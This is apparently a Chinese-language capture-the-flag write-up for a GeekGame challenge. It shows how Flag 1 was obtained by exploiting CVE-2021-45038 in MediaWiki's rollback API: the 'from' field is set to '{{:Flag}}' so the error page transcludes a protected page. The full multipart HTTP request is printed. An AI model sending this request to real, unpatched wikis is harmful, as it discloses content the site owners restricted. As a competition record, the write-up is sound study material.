# 私有笔记

> 第二阶段提示后。

## Flag 1

根据提示，利用 [CVE-2021-45038](https://attackerkb.com/topics/nQ4e21277J/cve-2021-45038/vuln-details)，发送一个 `rollback` 请求，并将 `from` 参数设置为 `{{:Flag}}`，此时返回的回退失败的页面上会自动嵌入 `{{:Flag}}` 页面的内容，从而得到 Flag 1。

```txt
> POST /api.php%26action=rollback HTTP/2
> Host: prob07-2uqyuho6.geekgame.pku.edu.cn
> user-agent: insomnia/2022.4.2
> content-type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY
> accept: */*
> content-length: 341

* STATE: DO => DID handle 0xb6e02f1c808; line 2077 (connection #3)
* multi changed, check CONNECT_PEND queue!
* STATE: DID => PERFORMING handle 0xb6e02f1c808; line 2196 (connection #3)

| --X-INSOMNIA-BOUNDARY
| Content-Disposition: form-data; name="action"
| rollback
| --X-INSOMNIA-BOUNDARY
| Content-Disposition: form-data; name="token"
| +\\
| --X-INSOMNIA-BOUNDARY
| Content-Disposition: form-data; name="user"
| Flag1
| --X-INSOMNIA-BOUNDARY
| Content-Disposition: form-data; name="from"
| {{:Flag}}
| --X-INSOMNIA-BOUNDARY--
```
